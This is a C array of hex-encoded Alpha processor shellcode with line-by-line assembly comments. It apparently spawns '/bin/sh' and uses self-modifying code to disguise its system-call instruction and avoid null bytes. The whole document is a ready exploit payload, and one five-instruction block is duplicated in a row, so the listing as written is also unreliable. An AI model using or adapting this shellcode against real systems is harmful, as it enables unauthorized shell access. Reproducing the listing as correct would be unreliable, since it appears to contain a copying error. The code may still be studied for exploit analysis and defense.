char shellcode[]=
        "\x30\x15\xd9\x43"      /* subq $30,200,$16             */
        /* $16 = $30 - 200
        /* $16 must have the shellcode address. However, before */
        /* the bsr instruction, $16 can't have the address.     */
        /* This instruction just store the meaningless address. */
        /* The all instruction before bsr are meaningless.      */

        "\x11\x74\xf0\x47"      /* bis $31,0x83,$17             */
        /* $17 = 0 or 0x83                                      */
        /* $17 = 0x83                                           */
        "\x12\x94\x07\x42"      /* addq $16,60,$18              */
        "\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
        /* $17("\x83\x00\x00\x00") is stored in $16 + 60 - 4    */
        /* address.                                             */
        /* ( "\xff\xff\xff\xff" -> "\x83\x00\x00\x00" )         */

        "\xff\x47\x3f\x26"      /* ldah $17,0x47ff($31)         */
        "\x1f\x04\x31\x22"      /* lda $17,0x041f($17)          */
        /* $17 = "\x1f\x04\xff\x47"                             */
        /* "\x1f\x04\xff\x47" is nop instruction.               */

        "\xfc\xff\x30\xb2"      /* stl $17,-4($16)              */
        /* change "bsr $16,-28" instruction" into nop           */
        /* instruction to pass through the bsr instruction.     */
        /* ( "\xf9\xff\x1f\xd2" -> "\x1f\x04\xff\x47" )         */

        "\xf9\xff\x1f\xd2"      /* bsr $16,-28                  */
        /* Jump to "bis $31,0x83,$17" and store the current     */
        /* address in the $16.                                  */
        /* After jump, this insturction will be changed into    */
        /* nop instruction.                                     */

        "\x30\x15\xd9\x43"      /* subq $30,200,$16             */
        "\x31\x15\xd8\x43"      /* subq $30,192,$17             */
        "\x12\x04\xff\x47"      /* clr $18                      */
        "\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
        "\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
        "\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
        "\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
        "\x12\x04\xff\x47"      /* clr $18                      */
        "\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
        "\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
        "\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
        "\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
        "\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
        "\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
        "\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
        "\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
        "\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
        "\x13\x94\xe7\x43"      /* addq $31,60,$19              */
        "\x20\x35\x60\x42"      /* subq $19,1,$0                */

        "\xff\xff\xff\xff";     /* callsys ( disguised )        */
        /* This will be changed to "\x83\x00\x00\x00"           */